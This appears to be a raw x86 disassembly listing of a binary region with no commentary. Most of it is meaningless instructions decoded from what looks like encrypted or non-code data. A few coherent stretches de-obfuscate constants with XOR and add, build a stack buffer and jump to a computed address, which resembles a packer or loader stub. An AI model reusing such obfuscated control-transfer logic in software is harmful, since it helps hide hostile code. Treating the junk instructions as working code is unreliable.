  412345:	push   0xffffffca
  412347:	stos   BYTE PTR es:[edi],al
  412348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412349:	dec    ecx
  41234a:	xchg   esp,eax
  41234b:	test   DWORD PTR [ebx+0x5ec4bcfc],edi
  412351:	xor    al,BYTE PTR [ebx+edi*1]
  412354:	mov    al,BYTE PTR [ebx+0x5]
  412357:	xchg   edx,eax
  412358:	hlt    
  412359:	sbb    eax,0x7a0563c2
  41235e:	adc    edi,DWORD PTR [eax+0x1b]
  412361:	mov    cl,0x37
  412363:	push   edx
  412364:	in     eax,0xa8
  412366:	cld    
  412367:	inc    edx
  412368:	dec    ebp
  412369:	mov    bh,0xb5
  41236b:	nop
  41236c:	cmp    DWORD PTR [ebp-0x22],edi
  41236f:	das    
  412370:	inc    esi
  412371:	rol    DWORD PTR [edx+0x3cdc0b3],0xe9
  412378:	fild   WORD PTR [ecx+0x70]
  41237b:	cwde   
  41237c:	mov    bh,BYTE PTR [esi-0x48]
  41237f:	jmp    0x34c8ba4b
  412384:	or     BYTE PTR [eax+eax*2+0xf],dl
  412388:	sbb    al,0x64
  41238a:	add    BYTE PTR [eax-0x49131f93],dl
  412390:	cmp    DWORD PTR [ebp-0x60f8e350],edi
  412396:	loope  0x4123fd
  412398:	mov    bl,0x75
  41239a:	mov    esi,0x1b542ac
  41239f:	(bad)
  4123a2:	mov    edi,DWORD PTR [eax+0x315b156f]
  4123a8:	mov    ebp,edx
  4123aa:	mov    cl,0xfc
  4123ac:	jle    0x4123b1
  4123ae:	outs   dx,DWORD PTR ds:[esi]
  4123af:	or     esp,esp
  4123b1:	jno    0x4123ea
  4123b3:	aas    
  4123b4:	xchg   ebx,eax
  4123b5:	aad    0x53
  4123b7:	xchg   BYTE PTR [ecx+0x45],ch
  4123ba:	jge    0x412413
  4123bc:	test   BYTE PTR [edi+0x1752cb02],dl
  4123c2:	inc    DWORD PTR [esi]
  4123c4:	jmp    0x412410
  4123c6:	enter  0xff64,0x53
  4123ca:	lahf   
  4123cb:	sbb    eax,0x45044eaf
  4123d0:	mov    ds:0x7dbb1392,al
  4123d5:	sbb    cl,bl
  4123d7:	sub    eax,0xea27ef3c
  4123dc:	mov    edi,ebx
  4123de:	inc    eax
  4123df:	push   ebx
  4123e0:	sub    edi,edx
  4123e2:	dec    esi
  4123e3:	sub    al,0x2a
  4123e5:	clc    
  4123e6:	and    BYTE PTR [ebx+0x78658358],cl
  4123ec:	out    0x87,eax
  4123ee:	sahf   
  4123ef:	popa   
  4123f0:	jne    0x412469
  4123f2:	call   0x85a4:0x3066e0d9
  4123f9:	sbb    ah,BYTE PTR [edx]
  4123fb:	mov    edx,0x4bf7e211
  412400:	pop    ds
  412401:	mov    fs,WORD PTR ds:0x383ea581
  412407:	iret   
  412408:	call   0x6e1e:0x26f38d55
  41240f:	out    0xb2,al
  412411:	inc    ecx
  412412:	mov    WORD PTR ss:[ebx-0x40c53ed4],ds
  412419:	outs   dx,DWORD PTR ds:[esi]
  41241a:	jbe    0x41248c
  41241c:	xor    eax,0xcc3f279c
  412421:	xchg   ebp,eax
  412422:	aas    
  412423:	pop    ds
  412424:	pop    esi
  412425:	pop    ebp
  412426:	add    ah,BYTE PTR [edx-0x16d44921]
  41242c:	add    eax,0xf487f5c8
  412431:	lods   al,BYTE PTR ds:[esi]
  412432:	popf   
  412433:	iret   
  412434:	pop    ecx
  412435:	ror    BYTE PTR ss:[ebx-0x325f1416],cl
  41243c:	call   0xcfb6:0xef0962
  412443:	and    BYTE PTR [ecx+0x25],bh
  412446:	out    0xc8,al
  412448:	push   ebp
  412449:	shl    DWORD PTR [esi-0x2e315dbd],cl
  41244f:	inc    ebx
  412450:	pop    esp
  412451:	pop    ecx
  412452:	fimul  WORD PTR [edi-0x70a87a0e]
  412458:	jmp    0x4124b4
  41245a:	and    BYTE PTR [esi+ebx*4+0x76],al
  41245e:	cmp    al,0x85
  412460:	fwait
  412461:	repz inc edx
  412463:	sahf   
  412464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412465:	mov    cl,0x70
  412467:	sbb    ebp,DWORD PTR [edi-0x2c]
  41246a:	das    
  41246b:	lea    ebp,[ecx-0x78]
  41246e:	gs pusha 
  412470:	aas    
  412471:	(bad)  
  412472:	xchg   ecx,eax
  412473:	in     eax,0xcc
  412475:	xor    dh,al
  412477:	and    edx,DWORD PTR [ebx+eiz*4]
  41247a:	cld    
  41247b:	cld    
  41247c:	mov    eax,ds:0xc2f741c9
  412481:	(bad)  
  412482:	in     eax,dx
  412483:	xor    cl,BYTE PTR [ecx+0x4fb9fcc5]
  412489:	xor    BYTE PTR [ebx+0x26],dl
  41248c:	int3   
  41248d:	mov    ds:0x9c336c7a,al
  412492:	jmp    0x4124dc
  412494:	xchg   ecx,eax
  412495:	mov    WORD PTR [ebp-0x36d4c500],gs
  41249b:	shr    BYTE PTR [ecx+0x4d7edb6f],0x53
  4124a2:	mov    ebx,0x2a9c7711
  4124a7:	outs   dx,BYTE PTR ds:[esi]
  4124a8:	imul   ebp,DWORD PTR [edi-0x5dd43751],0xf804cc70
  4124b2:	cmp    BYTE PTR [ebx-0x31],cl
  4124b5:	(bad)  
  4124b6:	push   eax
  4124b7:	cmp    al,0xc5
  4124b9:	adc    dl,al
  4124bb:	sbb    al,0x23
  4124bd:	mov    ch,0xb6
  4124bf:	dec    ebx
  4124c0:	bound  eax,QWORD PTR [edi]
  4124c2:	fnstcw WORD PTR [ecx-0x80]
  4124c5:	mov    eax,0xcd22152f
  4124ca:	aam    0x97
  4124cc:	(bad)  
  4124cd:	xchg   ebp,eax
  4124ce:	sbb    BYTE PTR [ebx-0x76e7bd55],ah
  4124d4:	outs   dx,BYTE PTR ds:[esi]
  4124d5:	call   0x41d8:0xf9af188c
  4124dc:	add    eax,DWORD PTR [ebp+0x8]
  4124df:	mov    DWORD PTR [ebp-0x10],eax
  4124e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	inc    ebp
  41259f:	xchg   DWORD PTR [eax],esi
  4125a1:	xchg   ebp,eax
  4125a2:	pop    ecx
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x412628
  4125ab:	(bad)  
  4125ac:	addr16 inc edx
  4125ae:	xor    eax,0x8c90cbf8
  4125b3:	addr16 push edi
  4125b5:	adc    al,0xd0
  4125b7:	add    dh,BYTE PTR [ebp+0x5054e61d]
  4125bd:	shl    DWORD PTR [ebx],cl
  4125bf:	add    esp,DWORD PTR [edx-0x6ac41224]
  4125c5:	rol    BYTE PTR [ebp-0x6b],1
  4125c8:	pusha  
  4125c9:	(bad)  
  4125ca:	fcomp  st(5)
  4125cc:	hlt    
  4125cd:	inc    eax
  4125ce:	nop
  4125cf:	sbb    bh,BYTE PTR [eax+edi*1-0x178ca315]
  4125d6:	mov    ebx,0xb299bead
  4125db:	xor    ch,al
  4125dd:	out    dx,al
  4125de:	push   edi
  4125df:	int3   
  4125e0:	gs mov ah,0x2b
  4125e3:	and    BYTE PTR [edi-0x5633569d],0x78
  4125ea:	popf   
  4125eb:	cmp    edi,DWORD PTR ds:0xe5b3bf62
  4125f1:	fwait
  4125f2:	pop    edi
  4125f3:	bound  edx,QWORD PTR [esi+0x760f8055]
  4125f9:	rcr    DWORD PTR [edx],cl
  4125fb:	cld    
  4125fc:	enter  0x747c,0xf3
  412600:	sbb    BYTE PTR [esi],bl
  412602:	leave  
  412603:	data16 and BYTE PTR [edx+0xd4df1d5],al
  41260a:	xchg   edx,eax
  41260b:	out    0xbe,eax
  41260d:	aas    
  41260e:	add    edx,edx
  412610:	or     eax,0x3f80610b
  412615:	push   ecx
  412616:	jg     0x4125bc
  412618:	daa    
  412619:	dec    esp
  41261a:	xor    edi,DWORD PTR [ebx+0x2]
  41261d:	mov    cl,0x4f
  41261f:	(bad)  
  412620:	mov    cl,0x76
  412622:	cmp    BYTE PTR [eax],dl
  412624:	test   eax,0x4938b70e
  412629:	out    0x65,al
  41262b:	jl     0x4125e8
  41262d:	jae    0x4125e8
  41262f:	add    esi,esi
  412631:	movntps XMMWORD PTR [eax],xmm2
  412634:	push   esi
  412635:	or     edi,DWORD PTR [edi]
  412637:	rcr    BYTE PTR ds:[ebx-0x2470b57a],cl
  41263e:	or     eax,0x61249a28
  412643:	test   BYTE PTR [edi-0x22334a73],cl
  412649:	ins    DWORD PTR es:[edi],dx
  41264a:	mov    bh,0x6b
  41264c:	jge    0x412630
  41264e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41264f:	je     0x4125eb
  412651:	pop    ebp
  412652:	out    0xc0,al
  412654:	mov    ebx,0x484822be
  412659:	ins    DWORD PTR es:[edi],dx
  41265a:	mov    ds:0xeac52a31,al
  41265f:	pop    ebp
  412660:	cmp    DWORD PTR [ebx],0x33
  412663:	shr    DWORD PTR [edx+0x657594fa],1
  412669:	and    edx,DWORD PTR [esi]
  41266b:	sbb    al,0xff
  41266d:	rcr    DWORD PTR [eax-0x57],1
  412670:	loope  0x412674
  412672:	nop
  412673:	and    BYTE PTR [edi-0x5052c7f7],bh
  412679:	mov    ebp,DWORD PTR [edi+0x7a]
  41267c:	pushf  
  41267d:	rcr    BYTE PTR [esi+edi*4+0x2d800bb8],cl
  412684:	mov    dl,bh
  412686:	les    esi,FWORD PTR [ebp-0x1c71841c]
  41268c:	mov    bl,0x71
  41268e:	push   0xffffffcd
  412690:	xor    al,0x75
  412692:	sti    
  412693:	or     edx,DWORD PTR ds:[ebp-0x515bc083]
  41269a:	sbb    al,0x3a
  41269c:	in     eax,0xc5
  41269e:	icebp  
  41269f:	aas    
  4126a0:	or     DWORD PTR [ecx-0x5efe2b89],esp
  4126a6:	je     0x412708
  4126a8:	aas    
  4126a9:	popa   
  4126aa:	and    ecx,edi
  4126ac:	or     al,0xc9
  4126ae:	bound  esp,QWORD PTR [eax]
  4126b0:	idiv   DWORD PTR [edi+0x424ec7f8]
  4126b6:	xchg   esi,eax
  4126b7:	pop    ecx
  4126b8:	adc    al,0xe5
  4126ba:	ds mov esi,0xf1ae7e45
  4126c0:	pushf  
  4126c1:	sub    ch,BYTE PTR [ebx]
  4126c3:	xchg   esi,eax
  4126c4:	mov    edx,0x39ab7ec5
  4126c9:	ss pop eax
  4126cb:	pop    es
  4126cc:	cdq    
  4126cd:	fwait
  4126ce:	cmp    eax,DWORD PTR [edi-0x2cb3ba13]
  4126d4:	push   cs
  4126d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d6:	mov    al,ds:0x3e752be
  4126db:	addr16 jge 0x4126af
  4126de:	enter  0x7f87,0xfe
  4126e2:	fmul   QWORD PTR [ebp+0x86302d2]
  4126e8:	adc    ebp,DWORD PTR [eax]
  4126ea:	test   eax,0x84259ce
  4126ef:	rcl    BYTE PTR [ebx],0xf1
  4126f2:	cld    
  4126f3:	jbe    0x412698
  4126f5:	pusha  
  4126f6:	push   ebp
  4126f7:	mov    ah,0xe
  4126f9:	and    eax,0x792a0684
  4126fe:	xchg   al,dl
  412700:	adc    al,0x83
  412702:	(bad)  
  412703:	xlat   BYTE PTR ds:[ebx]
  412704:	int    0xf8
  412706:	jae    0x412779
  412708:	arpl   WORD PTR [ebx],si
  41270a:	test   eax,0x141ca9d
  41270f:	out    dx,al
  412710:	xchg   BYTE PTR [eax+ebx*2+0x43fac766],bl
  412717:	adc    al,BYTE PTR [eax+0x3a8d696e]
  41271d:	pop    edi
  41271e:	pop    edi
  41271f:	imul   ecx,DWORD PTR ds:0x17775e41,0xffffff8e
  412726:	pop    ebx
  412727:	xor    BYTE PTR [ecx+0x5c],dl
  41272a:	mov    ebx,ss
  41272c:	adc    ebx,DWORD PTR [ebx]
  41272e:	mov    al,0x39
  412730:	push   esp
  412731:	out    dx,al
  412732:	dec    esi
  412733:	jg     0x4126d0
  412735:	dec    esp
  412736:	in     eax,dx
  412737:	sub    eax,0x3e577107
  41273c:	je     0x412787
  41273e:	jns    0x412724
  412740:	sbb    DWORD PTR [edx-0x19c9aa8b],0x7a
  412747:	mov    ebp,0x52878a44
  41274c:	push   ebp
  41274d:	test   BYTE PTR [esi],0x3e
  412750:	test   DWORD PTR [esi-0x6f],ebx
  412753:	push   edi
  412754:	(bad)  
  412755:	call   0xbd89df4e
  41275a:	iret   
  41275b:	shr    BYTE PTR ds:0x90a1786f,cl
  412761:	dec    ebp
  412762:	mov    bl,0x6
  412764:	mov    dh,0xdd
  412766:	mov    ebx,0x50d45e04
  41276b:	loope  0x412777
  41276d:	cmp    esp,0xffffffff
  412770:	dec    ebp
  412771:	adc    BYTE PTR [ebx+edx*8-0x48],dh
  412775:	loope  0x41276f
  412777:	rol    DWORD PTR [edx+0x74],cl
  41277a:	popa   
  41277b:	arpl   WORD PTR [ebp-0x44e22e03],si
  412781:	mov    DWORD PTR [edx+0x18],ebx
  412784:	push   edi
  412785:	xchg   ebx,eax
  412786:	dec    edi
  412787:	pop    esi
  412788:	test   al,0x6b
  41278a:	jmp    0x4127d0
  41278c:	adc    esi,DWORD PTR [ebx]
  41278e:	shr    ecx,0xfb
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	add    ecx,DWORD PTR [esi]
  4127a2:	cwde   
  4127a3:	ins    DWORD PTR es:[edi],dx
  4127a4:	inc    esp
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x412745
  4127ad:	(bad)  
  4127ae:	fist   DWORD PTR [ecx]
  4127b0:	mov    ds:0xe1136684,al
  4127b5:	mov    edi,edx
  4127b7:	mov    WORD PTR [esi-0x31],es
  4127ba:	or     eax,DWORD PTR [ebx]
  4127bc:	fdivr  DWORD PTR [esi+0x746fb1bb]
  4127c2:	adc    bl,cl
  4127c4:	ins    DWORD PTR es:[edi],dx
  4127c5:	adc    BYTE PTR [ebx-0x5476b65a],dl
  4127cb:	call   0xc31:0x9a23fe21
  4127d2:	idiv   ah
  4127d4:	jne    0x41279a
  4127d6:	scas   eax,DWORD PTR es:[edi]
  4127d7:	in     eax,dx
  4127d8:	mov    esi,0xbadc9c60
  4127dd:	ins    BYTE PTR es:[edi],dx
  4127de:	sub    ah,BYTE PTR [ebp-0x23bd8014]
  4127e4:	pop    es
  4127e5:	fmul   QWORD PTR [esp+ebx*1-0x3c]
  4127e9:	loope  0x41277f
  4127eb:	xchg   ecx,eax
  4127ec:	jmp    0x87dfd7fb
  4127f1:	sahf   
  4127f2:	cmp    esi,DWORD PTR gs:[ebp+0x525db763]
  4127f9:	or     DWORD PTR [ebx+edx*1-0x2b],esi
  4127fd:	pop    ss
  4127fe:	js     0x4127ee
  412800:	mov    dl,0x1f
  412802:	mov    esp,0x492179fd
  412807:	xor    BYTE PTR [edx-0x7b],ch
  41280a:	push   eax
  41280b:	cld    
  41280c:	mov    al,ds:0xd63fb46d
  412811:	jle    0x41282c
  412813:	stc    
  412814:	mov    esi,0x634a1bf2
  412819:	imul   edx,esp,0xc20b1d2a
  41281f:	(bad)  
  412820:	jle    0x4127e9
  412822:	fnstenv [esi-0x45]
  412825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412826:	push   ebx
  412827:	sbb    al,0xd3
  412829:	add    eax,0x8ed41938
  41282e:	lods   eax,DWORD PTR ds:[esi]
  41282f:	adc    al,0x6f
  412831:	add    al,0x34
  412833:	sbb    DWORD PTR [ebp+0x78],eax
  412836:	loopne 0x41285b
  412838:	mov    al,ds:0x5830627
  41283d:	mov    ebp,0x94e25bbd
  412842:	pop    esi
  412843:	cdq    
  412844:	leave  
  412845:	adc    eax,0x240940ab
  41284a:	pop    edx
  41284b:	fs adc ebp,esp
  41284e:	adc    DWORD PTR [edi-0x29884d13],edx
  412854:	and    DWORD PTR [eax],edi
  412856:	mov    ecx,0x626b1f29
  41285b:	xchg   ebx,eax
  41285c:	out    dx,eax
  41285d:	mov    ah,0x49
  41285f:	call   0x90bcde6d
  412864:	mov    bl,0x66
  412866:	ja     0x4127f2
  412868:	xor    dh,BYTE PTR [ecx-0x101c8e7b]
  41286e:	stos   BYTE PTR es:[edi],al
  41286f:	cmp    DWORD PTR [esi],ebx
  412871:	out    dx,eax
  412872:	push   0xffffff9d
  412874:	xor    DWORD PTR [edx-0x23],0xffffffbf
  412878:	shr    BYTE PTR [ebp+0x5236d4ed],1
  41287e:	ins    DWORD PTR es:[edi],dx
  41287f:	(bad)  
  412880:	(bad)  [ebx-0x21857f51]
  412886:	sbb    edi,DWORD PTR [ebx-0x30]
  412889:	cs inc esi
  41288b:	lea    ebx,[ebx-0x41c20f47]
  412891:	add    bl,0xa
  412894:	shr    BYTE PTR [ebx],cl
  412896:	pop    ecx
  412897:	xlat   BYTE PTR ds:[ebx]
  412898:	adc    ax,0x9458
  41289c:	lahf   
  41289d:	or     cl,BYTE PTR [edi]
  41289f:	jl     0x412896
  4128a1:	jno    0x412918
  4128a3:	div    BYTE PTR [ebx]
  4128a5:	aam    0x55
  4128a7:	jecxz  0x41291a
  4128a9:	test   al,0x5a
  4128ab:	cs pop eax
  4128ad:	fist   WORD PTR [ebp-0x3097842d]
  4128b3:	and    eax,0xaef100c
  4128b8:	inc    ecx
  4128b9:	cli    
  4128ba:	jb     0x4128de
  4128bc:	xchg   esi,eax
  4128bd:	inc    edi
  4128be:	cdq    
  4128bf:	push   esp
  4128c0:	(bad)  
  4128c1:	repz mov edi,0x9f2c4e2f
  4128c7:	call   0x3bd51105
  4128cc:	and    DWORD PTR [eax-0x345cccb3],0x2
  4128d3:	push   esi
  4128d4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4128d6:	fcomp  st(3)
  4128d8:	cmc    
  4128d9:	into   
  4128da:	jo     0x4128c4
  4128dc:	or     al,0xa3
  4128de:	sbb    esi,ebx
  4128e0:	inc    edx
  4128e1:	fmul   QWORD PTR [edi-0x38]
  4128e4:	ss daa 
  4128e6:	jp     0x412926
  4128e8:	stos   BYTE PTR es:[edi],al
  4128e9:	xchg   ebx,eax
  4128ea:	add    bl,dh
  4128ec:	mov    bl,0x7a
  4128ee:	fnstsw WORD PTR [edx]
  4128f0:	xlat   BYTE PTR ds:[ebx]
  4128f1:	mov    bl,0x36
  4128f3:	sbb    ebp,DWORD PTR [edx]
  4128f5:	mov    bh,0xe7
  4128f7:	stc    
  4128f8:	push   0xffffffd2
  4128fa:	clc    
  4128fb:	clc    
  4128fc:	or     ecx,DWORD PTR [esi-0x63]
  4128ff:	add    eax,0x316abe64
  412904:	mov    esi,0xbfe83ae2
  412909:	or     eax,0xb1e48e0b
  41290e:	outs   dx,BYTE PTR ds:[esi]
  41290f:	jp     0x4128f2
  412911:	ds in  al,dx
  412913:	pop    ss
  412914:	dec    edx
  412915:	retf   
  412916:	jp     0x412942
  412918:	outs   dx,BYTE PTR ds:[esi]
  412919:	cmc    
  41291a:	(bad)  
  41291b:	fcom   DWORD PTR [ebx+0x5e]
  41291e:	out    dx,eax
  41291f:	call   0xd856:0x701ffb6b
  412926:	xor    BYTE PTR [edi+0x5fdef92b],ah
  41292c:	inc    esi
  41292d:	jmp    DWORD PTR [esi+0x4f630a0e]
  412933:	push   0xffffffee
  412935:	and    edx,DWORD PTR ds:0xd4c0769a
  41293b:	mov    dl,0x9b
  41293d:	jnp    0x412967
  41293f:	int3   
  412940:	or     esi,ebx
  412942:	inc    ebp
  412943:	add    dh,dl
  412945:	sub    DWORD PTR [ebx+0x44],edx
  412948:	cld    
  412949:	jge    0x41291e
  41294b:	(bad)  
  41294c:	mov    bl,BYTE PTR [eax-0x66]
  41294f:	sbb    ebp,DWORD PTR [eax+eiz*4-0x3d]
  412953:	xlat   BYTE PTR ds:[ebx]
  412954:	repz pop edi
  412956:	in     eax,dx
  412957:	aad    0xa6
  412959:	(bad)  
  41295a:	imul   DWORD PTR es:[esi-0x6d]
  41295e:	lea    ebx,[edx]
  412960:	mov    DWORD PTR ds:0x597f2e11,edx
  412966:	jecxz  0x412975
  412968:	pop    esi
  412969:	fwait
  41296a:	jle    0x4129be
  41296c:	iret   
  41296d:	jno    0x412934
  41296f:	mov    ebx,fs
  412971:	pop    ds
  412972:	(bad)  
  412973:	xlat   BYTE PTR ds:[ebx]
  412974:	in     al,dx
  412975:	hlt    
  412976:	sysexit 
  412978:	xor    eax,0x20169ef4
  41297d:	xor    BYTE PTR [ecx+0x785c4c88],dl
  412983:	iret   
  412984:	cli    
  412985:	sbb    DWORD PTR [esi+0x102dbed8],eax
  41298b:	rep lods eax,DWORD PTR ds:[esi]
  41298d:	(bad)  
  41298e:	sub    DWORD PTR [ebx],eax
  412990:	(bad)  
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fcomp  DWORD PTR [edx-0x587b5738]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a3f
  4129fb:	imul   ebx,DWORD PTR [ebp-0xafc3d0a],0x4e
  412a02:	jle    0x412a4f
  412a04:	xchg   ebx,eax
  412a05:	add    eax,0xb27fcd97
  412a0a:	(bad)  
  412a0b:	lods   eax,DWORD PTR ds:[esi]
  412a0c:	dec    esp
  412a0d:	push   edi
  412a0e:	jb     0x412a83
  412a10:	les    ebx,FWORD PTR [esi]
  412a12:	pop    ds
  412a13:	ins    DWORD PTR es:[edi],dx
  412a14:	mov    edx,0x6a1eba99
  412a19:	jns    0x4129f1
  412a1b:	out    dx,eax
  412a1c:	lods   eax,DWORD PTR ds:[esi]
  412a1d:	ja     0x412a44
  412a1f:	jbe    0x412a39
  412a21:	dec    ebx
  412a22:	call   0x6341:0xeee508e
  412a29:	mov    edi,0x531b19da
  412a2e:	xor    eax,0x3b83da2c
  412a33:	mov    ?,WORD PTR [eax-0x46]
  412a36:	jnp    0x412a57
  412a38:	jge    0x412a61
  412a3a:	aas    
  412a3b:	push   es
  412a3c:	(bad)  
  412a3d:	mov    esp,0xfccbd294
  412a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a43:	call   DWORD PTR [edx+0x4eaf997]
  412a49:	adc    DWORD PTR [esi+0x71],ebp
  412a4c:	xor    BYTE PTR [ebx-0x6b083581],al
  412a52:	xor    cl,BYTE PTR [ecx]
  412a54:	retf   
  412a55:	aas    
  412a56:	pop    eax
  412a57:	imul   ebp,DWORD PTR [edx+0x9190721],0xfffffff4
  412a5e:	ret    0xa03e
  412a61:	icebp  
  412a62:	push   esi
  412a63:	fsub   QWORD PTR [edi]
  412a65:	adc    eax,0x39bc47e9
  412a6a:	addr16 dec esp
  412a6c:	mov    BYTE PTR [ecx+0x78],bl
  412a6f:	imul   edx,DWORD PTR [esi],0x8ab9e970
  412a75:	cmovae esi,DWORD PTR [ebp-0x22]
  412a79:	xchg   edx,eax
  412a7a:	fwait
  412a7b:	loop   0x412a26
  412a7d:	or     DWORD PTR [ecx-0xa],ebp
  412a80:	pop    ecx
  412a81:	cli    
  412a82:	dec    ecx
  412a83:	cli    
  412a84:	add    al,0x67
  412a86:	push   DWORD PTR [eax+eax*8+0x72]
  412a8a:	adc    BYTE PTR [ecx-0x2de0bb65],dh
  412a90:	ret    
  412a91:	sbb    ch,BYTE PTR [esi]
  412a93:	aad    0x3f
  412a95:	cmp    bl,BYTE PTR [ecx]
  412a97:	xor    ecx,ebx
  412a99:	imul   ecx,DWORD PTR [ebp+0x14],0xffffffc0
  412a9d:	pop    edx
  412a9e:	adc    al,0xb
  412aa0:	adc    esi,DWORD PTR [ebp+0x3d]
  412aa3:	cdq    
  412aa4:	sti    
  412aa5:	cmp    bl,bh
  412aa7:	ret    
  412aa8:	push   edx
  412aa9:	ficomp WORD PTR [ebx]
  412aab:	push   ds
  412aac:	push   es
  412aad:	out    0xf0,eax
  412aaf:	fcom   QWORD PTR [edi-0x7855b8bb]
  412ab5:	in     al,dx
  412ab6:	inc    ecx
  412ab7:	into   
  412ab8:	mov    cs,WORD PTR [eax]
  412aba:	pop    esi
  412abb:	out    0x3d,eax
  412abd:	sub    bh,ch
  412abf:	push   eax
  412ac0:	stos   DWORD PTR es:[edi],eax
  412ac1:	fsub   QWORD PTR ds:0x78800b3c
  412ac7:	adc    dl,BYTE PTR [ebx]
  412ac9:	xlat   BYTE PTR ds:[ebx]
  412aca:	and    DWORD PTR [ecx+0x2a],edx
  412acd:	jmp    0x412b17
  412acf:	push   ss
  412ad0:	jbe    0x412b4d
  412ad2:	pop    ebp
  412ad3:	push   esi
  412ad4:	in     al,dx
  412ad5:	leave  
  412ad6:	call   0xd39c:0xb4160719
  412add:	test   BYTE PTR [ebx+0x4f58d588],ch
  412ae3:	ret    
  412ae4:	shl    edi,cl
  412ae6:	jle    0x412a7f
  412ae8:	xor    DWORD PTR [ebx+ebp*8],edi
  412aeb:	dec    DWORD PTR [edx+0x49]
  412aee:	cmp    BYTE PTR [ecx+ebx*8],bh
  412af1:	sub    BYTE PTR [ebx+edx*2-0xcc7fef7],0x47
  412af9:	hlt    
  412afa:	(bad)  
  412afb:	push   ds
  412afc:	mov    bh,0x94
  412afe:	popf   
  412aff:	out    0xd2,eax
  412b01:	inc    esi
  412b02:	imul   ebp,DWORD PTR [ecx],0xfffffffa
  412b05:	sar    ecx,0x8a
  412b08:	mov    al,ds:0xcb589fa8
  412b0d:	aaa    
  412b0e:	or     DWORD PTR [eax+0x73],eax
  412b11:	xor    cl,bh
  412b13:	xchg   ecx,eax
  412b14:	cld    
  412b15:	outs   dx,BYTE PTR ds:[esi]
  412b16:	mul    BYTE PTR ds:[eax+ecx*4-0x36a55c2a]
  412b1e:	call   0xc41f:0xc6416e4d
  412b25:	jbe    0x412aeb
